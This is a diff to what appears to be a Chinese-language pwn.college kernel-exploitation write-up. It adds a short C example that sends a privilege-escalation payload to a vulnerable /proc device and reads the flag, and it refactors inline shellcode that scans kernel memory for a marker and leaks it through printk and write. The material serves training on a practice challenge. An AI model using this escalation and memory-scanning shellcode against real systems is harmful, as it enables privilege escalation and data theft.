@@ -378,6 +378,27 @@ int main(int argc, char *argv[]) {
 }
 ```
 
+使用我的 axium 后只要这样写：
+
+```c
+#include <axium/axium.h>
+
+int main(void) {
+  int fd = open("/proc/pwncollege", O_WRONLY);
+
+  payload_t escalate;
+  payload_init(&escalate);
+  ksc_escalate(&escalate, 0xffffffff81089660, 0xffffffff81089310);
+
+  write(fd, escalate.data, escalate.size);
+  system("cat /flag");
+
+  payload_fini(&escalate);
+
+  return 0;
+}
+```
+
 # Level 7.0
 
 ## Information
@@ -1068,9 +1089,6 @@ __pid_t load_flag()
 ```c
 #include <axium/axium.h>
 
-#define M_SC_SIDE_CHANNEL_OFFSET 0x11111111
-#define M_SC_SIZE 0x22222222
-
 #define PAGE_OFFSET 0xffff888000000000
 #define PRINTK_ADDR 0xffffffff810b69a9
 
@@ -1079,8 +1097,8 @@ DEFINE_SHELLCODE(sc_write) {
   SHELLCODE_START(sc_write);
   __asm__ volatile(
     "mov edi, 0x3\n"
-    "lea rsi, [rip + "XSTR(M_SC_SIDE_CHANNEL_OFFSET)"]\n"
-    "mov edx, "XSTR(M_SC_SIZE)"\n"
+    "lea rsi, [rip + " XSTR(SC_M(uint32_t, 1)) "]\n"
+    "mov edx, " XSTR(SC_M(uint32_t, 2)) "\n"
     "mov eax, 0x1\n"
     "syscall\n" // write(0x3, side_channel_start, sizeof(side_channel))
   );
@@ -1090,7 +1108,7 @@ DEFINE_SHELLCODE(sc_write) {
 DEFINE_SHELLCODE(sc_side_channel) {
   SHELLCODE_START(sc_side_channel);
   __asm__ volatile(
-      "mov rdi, "XSTR(PAGE_OFFSET)"\n"
+      "mov rdi, " XSTR(PAGE_OFFSET) "\n"
       "mov rbx, [rip + mark]\n"
       "loop:\n"
       "  cmp rbx, [rdi]\n"
@@ -1099,7 +1117,7 @@ DEFINE_SHELLCODE(sc_side_channel) {
       "  jmp loop\n"
       "print:\n"
       "  push rdi\n"
-      "  mov rax, "XSTR(PRINTK_ADDR)"\n"
+      "  mov rax, " XSTR(PRINTK_ADDR) "\n"
       "  call rax\n"
       "  pop rdi\n"
       "  inc rdi\n"
@@ -1123,8 +1141,8 @@ int main(void) {
   payload_t sc_write;
   payload_init(&sc_write);
   PAYLOAD_PUSH_SC(&sc_write, sc_write);
-  payload_patch_rel32(&sc_write, M_SC_SIDE_CHANNEL_OFFSET, sc_write.size);
-  payload_patch_u32(&sc_write, M_SC_SIZE, sc_side_channel.size);
+  sc_fix_rel(&sc_write, 1, (uint32_t)sc_write.size);
+  sc_fix(&sc_write, 2, (uint32_t)sc_side_channel.size);
 
   payload_t payload;
   payload_init(&payload);
